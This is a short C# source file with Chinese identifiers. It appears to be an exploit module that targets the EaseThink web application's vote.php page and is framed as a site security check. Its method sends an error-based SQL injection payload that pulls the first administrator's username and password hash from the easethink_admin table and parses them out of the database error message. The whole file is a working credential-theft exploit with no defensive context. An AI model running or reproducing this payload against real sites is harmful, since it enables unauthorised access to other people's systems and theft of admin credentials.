using System;
using System.Net;
namespace windowsmanger
{
	internal class Easytuan
	{
		public string exp(string url)
		{
			string urls = url;
			if (!urls.Contains("http://"))
			{
				urls = "http://" + urls;
			}
			string jieguo = this.expzhuru(urls);
			if (jieguo != "")
			{
				return jieguo;
			}
			return "网站未发现安全隐患";
		}
		public string expzhuru(string url)
		{
			string result;
			try
			{
				string exps = "/vote.php?act=dovote&name[1+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,adm_name,0x7c,adm_password)+from+`easethink_admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`'`+][111]=aa";
				WebClient cli = new WebClient();
				string shuju = cli.DownloadString(url + exps);
				cli.Headers.Add("user-agent", "Baiduspider");
				int kaishi = shuju.IndexOf("Error infos: Duplicate entry '");
				string shuju2 = shuju.Substring(kaishi + 30, 200);
				int jieshu = shuju2.IndexOf("'");
				string jieguo = shuju2.Substring(0, jieshu);
				result = jieguo;
			}
			catch
			{
				result = "";
			}
			return result;
		}
	}
}
